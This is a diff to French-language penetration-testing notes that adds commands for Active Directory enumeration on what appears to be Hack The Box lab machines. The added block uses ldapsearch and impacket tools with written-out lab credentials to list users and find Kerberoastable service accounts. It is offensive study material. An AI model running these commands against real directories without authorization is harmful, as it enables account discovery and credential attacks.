@@ -68,6 +68,19 @@ ldapsearch -D 'Julia.Wong' -w 'Computer1' -H ldap://10.129.44.190 -b "DC=breach,
 # Avoir uniquement les informations essentiels
 ldapsearch -D 'Julia.Wong@breach.vl' -w 'Computer1' -H ldap://10.129.44.190 -b "DC=breach,DC=vl" "(&(objectCategory=person)(objectClass=user))" sAMAccountName description memberOf userPrincipalName
 ```
+```bash 
+# trouver liste des users
+ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
+# trouver liste des users avec impacket
+impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100
+#trouver les comptes kerberoastable
+ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
+# trouver liste des comptes SPN avec impacket
+ impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100
+```
+
+
+
 ref : https://github.com/CravateRouge/bloodyAD/wiki/Enumeration
 https://www.hackingarticles.in/active-directory-penetration-testing-with-bloodyad/
 
